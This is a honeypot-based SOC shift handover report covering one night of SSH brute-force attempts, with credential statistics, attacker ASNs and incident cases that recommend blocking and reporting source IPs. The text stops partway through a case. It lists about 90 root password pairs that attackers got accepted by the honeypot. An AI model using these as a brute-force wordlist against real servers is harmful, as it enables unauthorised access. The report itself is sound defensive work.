# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-17 |
| **Generated At** | 2026-03-17T08:52:40Z |
| **Shift Time** | 08:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **551** |
| Confirmed Threats | **251** |
| False Positives Filtered | **300** (54.4%) |
| Unique Attacker IPs | **116** |
| Countries of Origin | **31** |
| High Severity Cases | **96** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **455** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **358** |
| Unique Credential Pairs | **296** |
| Unique Usernames | **186** |
| Unique Passwords | **232** |
| Successful Auth Pairs | **90** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 99 |
| `345gs5662d34` | 15 |
| `ubuntu` | 14 |
| `admin` | 7 |
| `user1` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 28 |
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `12345` | 11 |
| `12345678` | 10 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 15 |
| `root` | `ubuntu` | 2 |
| `minecraft` | `123456` | 2 |
| `user1` | `1111` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ubuntu` | `196.11.86.134` | 2026-03-17T01:53:52 |
| `root` | `test123` | `159.65.237.121` | 2026-03-17T02:03:33 |
| `root` | `rock` | `159.65.237.121` | 2026-03-17T02:03:59 |
| `root` | `Pass@123` | `159.65.237.121` | 2026-03-17T02:04:06 |
| `root` | `QWEqwe123` | `159.65.237.121` | 2026-03-17T02:04:25 |
| `root` | `test1234` | `159.65.237.121` | 2026-03-17T02:04:45 |
| `root` | `nPSpP4PBW0` | `159.65.237.121` | 2026-03-17T02:04:58 |
| `root` | `!Q2w3e4r` | `159.65.237.121` | 2026-03-17T02:05:24 |
| `root` | `phuvanduc` | `159.65.237.121` | 2026-03-17T02:05:30 |
| `root` | `password` | `159.65.237.121` | 2026-03-17T02:05:37 |
| `root` | `123456789` | `159.65.237.121` | 2026-03-17T02:05:44 |
| `root` | `P@ssw0rd123` | `159.65.237.121` | 2026-03-17T02:06:58 |
| `root` | `abc123456` | `161.35.121.57` | 2026-03-17T02:30:27 |
| `root` | `1qaz@WSX3edc` | `161.35.121.57` | 2026-03-17T02:30:34 |
| `root` | `ubuntu` | `161.35.121.57` | 2026-03-17T02:30:54 |
| `root` | `1234` | `161.35.121.57` | 2026-03-17T02:31:20 |
| `root` | `qq123456` | `161.35.121.57` | 2026-03-17T02:31:34 |
| `root` | `1qazxsw2` | `161.35.121.57` | 2026-03-17T02:31:41 |
| `root` | `aB123456` | `161.35.121.57` | 2026-03-17T02:31:54 |
| `root` | `!qaz@WSX` | `161.35.121.57` | 2026-03-17T02:32:07 |
| `root` | `kali` | `161.35.121.57` | 2026-03-17T02:32:27 |
| `root` | `helloworld` | `161.35.121.57` | 2026-03-17T02:32:34 |
| `root` | `!QAZ2wsx3edc` | `161.35.121.57` | 2026-03-17T02:32:41 |
| `root` | `parolamea` | `161.35.121.57` | 2026-03-17T02:33:20 |
| `root` | `qwe123456` | `161.35.121.57` | 2026-03-17T02:33:27 |
| `root` | `Password@123` | `161.35.121.57` | 2026-03-17T02:33:40 |
| `root` | `qwerty1` | `180.94.75.114` | 2026-03-17T02:36:01 |
| `root` | `147258` | `159.223.135.43` | 2026-03-17T03:12:46 |
| `root` | `P@ssword` | `159.223.135.43` | 2026-03-17T03:12:52 |
| `root` | `12qwaszx` | `159.223.135.43` | 2026-03-17T03:13:11 |
| `root` | `qwerty123` | `159.223.135.43` | 2026-03-17T03:13:24 |
| `root` | `redhat` | `159.223.135.43` | 2026-03-17T03:14:08 |
| `root` | `root123` | `159.223.135.43` | 2026-03-17T03:14:27 |
| `root` | `null` | `159.223.135.43` | 2026-03-17T03:15:11 |
| `root` | `!Q@W3e4r` | `159.223.135.43` | 2026-03-17T03:16:07 |
| `root` | `1qaz@WSX3edc` | `159.223.135.43` | 2026-03-17T03:17:09 |
| `root` | `China123` | `47.239.235.46` | 2026-03-17T03:21:43 |
| `root` | `3245gs5662d34` | `47.239.235.46` | 2026-03-17T03:21:46 |
| `root` | `5tgb^YHN` | `47.239.235.46` | 2026-03-17T03:23:22 |
| `root` | `123456@Abc` | `47.239.235.46` | 2026-03-17T03:23:51 |
| `root` | `stxadmin` | `112.184.45.204` | 2026-03-17T03:47:54 |
| `root` | `xmhdipc` | `46.39.251.94` | 2026-03-17T04:13:39 |
| `root` | `12345678` | `23.97.62.151` | 2026-03-17T04:46:58 |
| `root` | `root///` | `41.216.177.55` | 2026-03-17T04:59:05 |
| `root` | `3245gs5662d34` | `41.216.177.55` | 2026-03-17T04:59:09 |
| `root` | `P@$$w0rd` | `103.56.30.33` | 2026-03-17T05:00:08 |
| `root` | `3245gs5662d34` | `103.56.30.33` | 2026-03-17T05:00:10 |
| `root` | `Admin@2024` | `103.192.39.37` | 2026-03-17T05:15:58 |
| `root` | `3245gs5662d34` | `103.192.39.42` | 2026-03-17T05:16:03 |
| `root` | `11` | `134.122.18.242` | 2026-03-17T05:53:18 |
| `root` | `!QAZ2wsx3edc` | `134.122.18.242` | 2026-03-17T05:53:31 |
| `root` | `1qazXSW@` | `134.122.18.242` | 2026-03-17T05:54:36 |
| `root` | `tesTtest123a` | `134.122.18.242` | 2026-03-17T05:55:02 |
| `root` | `Welcome@123` | `134.122.18.242` | 2026-03-17T05:55:33 |
| `root` | `11111111` | `134.122.18.242` | 2026-03-17T05:56:05 |
| `root` | `toor` | `134.122.18.242` | 2026-03-17T05:56:44 |
| `root` | `Aa123456@` | `134.122.18.242` | 2026-03-17T05:56:56 |
| `root` | `null` | `134.122.18.242` | 2026-03-17T05:57:15 |
| `root` | `abc12345` | `134.122.18.242` | 2026-03-17T05:57:22 |
| `root` | `linux` | `134.122.18.242` | 2026-03-17T05:57:41 |
| `root` | `amir123` | `172.174.5.146` | 2026-03-17T06:24:40 |
| `root` | `3245gs5662d34` | `172.174.5.146` | 2026-03-17T06:24:45 |
| `root` | `Pradyumna@9452` | `183.81.33.183` | 2026-03-17T07:11:07 |
| `root` | `qwertyui` | `101.36.106.113` | 2026-03-17T07:27:37 |
| `root` | `3245gs5662d34` | `101.36.106.113` | 2026-03-17T07:27:40 |
| `root` | `Pradyumna@123` | `183.81.33.183` | 2026-03-17T07:28:14 |
| `root` | `QWEasd123...` | `172.214.209.153` | 2026-03-17T07:35:23 |
| `root` | `3245gs5662d34` | `172.214.209.153` | 2026-03-17T07:35:29 |
| `root` | `Pradyumna@987` | `183.81.33.183` | 2026-03-17T07:42:45 |
| `root` | `admin` | `103.139.154.160` | 2026-03-17T07:52:22 |
| `root` | `Pradyumna@2026` | `183.81.33.183` | 2026-03-17T07:59:45 |
| `root` | `A@123456` | `35.237.94.18` | 2026-03-17T08:00:35 |
| `root` | `3245gs5662d34` | `35.237.94.18` | 2026-03-17T08:00:41 |
| `root` | `A@123456` | `118.99.80.40` | 2026-03-17T08:06:39 |
| `root` | `3245gs5662d34` | `118.99.80.40` | 2026-03-17T08:06:43 |
| `root` | `server2025` | `118.99.80.40` | 2026-03-17T08:08:51 |
| `root` | `server2025` | `35.237.94.18` | 2026-03-17T08:10:38 |
| `root` | `A123456.` | `118.99.80.40` | 2026-03-17T08:10:58 |
| `root` | `Pradyumna@12345` | `183.81.33.183` | 2026-03-17T08:15:04 |
| `root` | `A123456.` | `35.237.94.18` | 2026-03-17T08:16:44 |
| `root` | `admin` | `170.64.231.91` | 2026-03-17T08:25:49 |
| `root` | `password` | `170.64.231.91` | 2026-03-17T08:26:40 |
| `root` | `Admin` | `183.81.33.183` | 2026-03-17T08:28:08 |
| `root` | `123456789` | `170.64.231.91` | 2026-03-17T08:28:19 |
| `root` | `1234` | `170.64.231.91` | 2026-03-17T08:29:11 |
| `root` | `12345` | `170.64.231.91` | 2026-03-17T08:30:01 |
| `root` | `qwerty` | `170.64.231.91` | 2026-03-17T08:31:07 |
| `root` | `Password123` | `181.49.3.38` | 2026-03-17T08:37:29 |
| `root` | `Admin0` | `183.81.33.183` | 2026-03-17T08:38:05 |
| `root` | `Admin1` | `183.81.33.183` | 2026-03-17T08:48:03 |

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **116** |
| Unique ASNs | **65** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS141153` | LCX International Technology Co., Limited | 9 | HIGH |
| `AS8075` | Microsoft Corporation | 9 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS3462` | Data Communication Business Group | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (79)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5d0894404feb

| Field | Detail |
|---|---|
| **Source IP** | `196.11.86[.]134` |
| **First Seen** | 2026-03-17 01:53 |
| **Last Seen** | 2026-03-17 01:55 |
| **Session Duration** | 96s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 01:53:51` | `cowrie.session.connect` |
| `2026-03-17 01:53:51` | `cowrie.client.version` |
| `2026-03-17 01:53:52` | `cowrie.client.kex` |
| `2026-03-17 01:53:52` | `cowrie.login.success` |
| `2026-03-17 01:55:27` | `cowrie.session.file_upload` |
| `2026-03-17 01:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.11.86[.]134` to AbuseIPDB if not already reported
- [ ] Block `196.11.86[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23db0eec7dc

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:30 |
| **Last Seen** | 2026-03-17 02:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:30:26` | `cowrie.session.connect` |
| `2026-03-17 02:30:26` | `cowrie.client.version` |
| `2026-03-17 02:30:26` | `cowrie.client.kex` |
| `2026-03-17 02:30:27` | `cowrie.login.success` |
| `2026-03-17 02:30:27` | `cowrie.session.params` |
| `2026-03-17 02:30:27` | `cowrie.command.input` |
| `2026-03-17 02:30:28` | `cowrie.log.closed` |
| `2026-03-17 02:30:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57753b8e0695

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:30 |
| **Last Seen** | 2026-03-17 02:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:30:33` | `cowrie.session.connect` |
| `2026-03-17 02:30:33` | `cowrie.client.version` |
| `2026-03-17 02:30:33` | `cowrie.client.kex` |
| `2026-03-17 02:30:34` | `cowrie.login.success` |
| `2026-03-17 02:30:34` | `cowrie.session.params` |
| `2026-03-17 02:30:34` | `cowrie.command.input` |
| `2026-03-17 02:30:34` | `cowrie.log.closed` |
| `2026-03-17 02:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ea41a125e6

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:30 |
| **Last Seen** | 2026-03-17 02:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:30:53` | `cowrie.session.connect` |
| `2026-03-17 02:30:53` | `cowrie.client.version` |
| `2026-03-17 02:30:53` | `cowrie.client.kex` |
| `2026-03-17 02:30:54` | `cowrie.login.success` |
| `2026-03-17 02:30:54` | `cowrie.session.params` |
| `2026-03-17 02:30:54` | `cowrie.command.input` |
| `2026-03-17 02:30:54` | `cowrie.log.closed` |
| `2026-03-17 02:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d332fdfa123

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:31 |
| **Last Seen** | 2026-03-17 02:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:31:20` | `cowrie.session.connect` |
| `2026-03-17 02:31:20` | `cowrie.client.version` |
| `2026-03-17 02:31:20` | `cowrie.client.kex` |
| `2026-03-17 02:31:20` | `cowrie.login.success` |
| `2026-03-17 02:31:21` | `cowrie.session.params` |
| `2026-03-17 02:31:21` | `cowrie.command.input` |
| `2026-03-17 02:31:21` | `cowrie.log.closed` |
| `2026-03-17 02:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a67185334c6

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:31 |
| **Last Seen** | 2026-03-17 02:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:31:33` | `cowrie.session.connect` |
| `2026-03-17 02:31:33` | `cowrie.client.version` |
| `2026-03-17 02:31:33` | `cowrie.client.kex` |
| `2026-03-17 02:31:34` | `cowrie.login.success` |
| `2026-03-17 02:31:34` | `cowrie.session.params` |
| `2026-03-17 02:31:34` | `cowrie.command.input` |
| `2026-03-17 02:31:35` | `cowrie.log.closed` |
| `2026-03-17 02:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e980e3ae8ca7

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:31 |
| **Last Seen** | 2026-03-17 02:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:31:40` | `cowrie.session.connect` |
| `2026-03-17 02:31:40` | `cowrie.client.version` |
| `2026-03-17 02:31:40` | `cowrie.client.kex` |
| `2026-03-17 02:31:41` | `cowrie.login.success` |
| `2026-03-17 02:31:41` | `cowrie.session.params` |
| `2026-03-17 02:31:41` | `cowrie.command.input` |
| `2026-03-17 02:31:41` | `cowrie.log.closed` |
| `2026-03-17 02:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b692a707e00

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:31 |
| **Last Seen** | 2026-03-17 02:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:31:53` | `cowrie.session.connect` |
| `2026-03-17 02:31:53` | `cowrie.client.version` |
| `2026-03-17 02:31:53` | `cowrie.client.kex` |
| `2026-03-17 02:31:54` | `cowrie.login.success` |
| `2026-03-17 02:31:54` | `cowrie.session.params` |
| `2026-03-17 02:31:54` | `cowrie.command.input` |
| `2026-03-17 02:31:55` | `cowrie.log.closed` |
| `2026-03-17 02:31:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c588089a79e

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:32 |
| **Last Seen** | 2026-03-17 02:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:32:06` | `cowrie.session.connect` |
| `2026-03-17 02:32:06` | `cowrie.client.version` |
| `2026-03-17 02:32:07` | `cowrie.client.kex` |
| `2026-03-17 02:32:07` | `cowrie.login.success` |
| `2026-03-17 02:32:08` | `cowrie.session.params` |
| `2026-03-17 02:32:08` | `cowrie.command.input` |
| `2026-03-17 02:32:08` | `cowrie.log.closed` |
| `2026-03-17 02:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e875e6c8835

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:32 |
| **Last Seen** | 2026-03-17 02:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:32:26` | `cowrie.session.connect` |
| `2026-03-17 02:32:26` | `cowrie.client.version` |
| `2026-03-17 02:32:27` | `cowrie.client.kex` |
| `2026-03-17 02:32:27` | `cowrie.login.success` |
| `2026-03-17 02:32:28` | `cowrie.session.params` |
| `2026-03-17 02:32:28` | `cowrie.command.input` |
| `2026-03-17 02:32:28` | `cowrie.log.closed` |
| `2026-03-17 02:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a1d0cd4be9

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:32 |
| **Last Seen** | 2026-03-17 02:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:32:33` | `cowrie.session.connect` |
| `2026-03-17 02:32:33` | `cowrie.client.version` |
| `2026-03-17 02:32:33` | `cowrie.client.kex` |
| `2026-03-17 02:32:34` | `cowrie.login.success` |
| `2026-03-17 02:32:34` | `cowrie.session.params` |
| `2026-03-17 02:32:34` | `cowrie.command.input` |
| `2026-03-17 02:32:34` | `cowrie.log.closed` |
| `2026-03-17 02:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23c6f57ae28

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:32 |
| **Last Seen** | 2026-03-17 02:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:32:40` | `cowrie.session.connect` |
| `2026-03-17 02:32:40` | `cowrie.client.version` |
| `2026-03-17 02:32:40` | `cowrie.client.kex` |
| `2026-03-17 02:32:41` | `cowrie.login.success` |
| `2026-03-17 02:32:41` | `cowrie.session.params` |
| `2026-03-17 02:32:41` | `cowrie.command.input` |
| `2026-03-17 02:32:42` | `cowrie.log.closed` |
| `2026-03-17 02:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c64151cf4e5f

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:33 |
| **Last Seen** | 2026-03-17 02:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:33:19` | `cowrie.session.connect` |
| `2026-03-17 02:33:20` | `cowrie.client.version` |
| `2026-03-17 02:33:20` | `cowrie.client.kex` |
| `2026-03-17 02:33:20` | `cowrie.login.success` |
| `2026-03-17 02:33:21` | `cowrie.session.params` |
| `2026-03-17 02:33:21` | `cowrie.command.input` |
| `2026-03-17 02:33:21` | `cowrie.log.closed` |
| `2026-03-17 02:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3a5af52e87

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:33 |
| **Last Seen** | 2026-03-17 02:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:33:26` | `cowrie.session.connect` |
| `2026-03-17 02:33:26` | `cowrie.client.version` |
| `2026-03-17 02:33:26` | `cowrie.client.kex` |
| `2026-03-17 02:33:27` | `cowrie.login.success` |
| `2026-03-17 02:33:28` | `cowrie.session.params` |
| `2026-03-17 02:33:28` | `cowrie.command.input` |
| `2026-03-17 02:33:28` | `cowrie.log.closed` |
| `2026-03-17 02:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e94701e19d3

| Field | Detail |
|---|---|
| **Source IP** | `161.35.121[.]57` |
| **First Seen** | 2026-03-17 02:33 |
| **Last Seen** | 2026-03-17 02:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:33:39` | `cowrie.session.connect` |
| `2026-03-17 02:33:39` | `cowrie.client.version` |
| `2026-03-17 02:33:39` | `cowrie.client.kex` |
| `2026-03-17 02:33:40` | `cowrie.login.success` |
| `2026-03-17 02:33:41` | `cowrie.session.params` |
| `2026-03-17 02:33:41` | `cowrie.command.input` |
| `2026-03-17 02:33:41` | `cowrie.log.closed` |
| `2026-03-17 02:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.121[.]57` to AbuseIPDB if not already reported
- [ ] Block `161.35.121[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7beca2cc3bf

| Field | Detail |
|---|---|
| **Source IP** | `180.94.75[.]114` |
| **First Seen** | 2026-03-17 02:35 |
| **Last Seen** | 2026-03-17 02:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 02:35:59` | `cowrie.session.connect` |
| `2026-03-17 02:35:59` | `cowrie.client.version` |
| `2026-03-17 02:35:59` | `cowrie.client.kex` |
| `2026-03-17 02:36:01` | `cowrie.login.success` |
| `2026-03-17 02:36:02` | `cowrie.direct-tcpip.request` |
| `2026-03-17 02:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.94.75[.]114` to AbuseIPDB if not already reported
- [ ] Block `180.94.75[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb821fa2d245

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:12 |
| **Last Seen** | 2026-03-17 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:12:45` | `cowrie.session.connect` |
| `2026-03-17 03:12:45` | `cowrie.client.version` |
| `2026-03-17 03:12:45` | `cowrie.client.kex` |
| `2026-03-17 03:12:46` | `cowrie.login.success` |
| `2026-03-17 03:12:46` | `cowrie.session.params` |
| `2026-03-17 03:12:46` | `cowrie.command.input` |
| `2026-03-17 03:12:46` | `cowrie.log.closed` |
| `2026-03-17 03:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.135[.]43` to AbuseIPDB if not already reported
- [ ] Block `159.223.135[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02fcbede9104

| Field | Detail |
|---|---|
| **Source IP** | `159.223.135[.]43` |
| **First Seen** | 2026-03-17 03:12 |
| **Last Seen** | 2026-03-17 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 03:12:51` | `cowrie.session.connect` |
| `2026-03-17 03:12:51` | `cowrie.client.version` |
| `2026-03-17 03:12:51` | `cowrie.client.kex` |
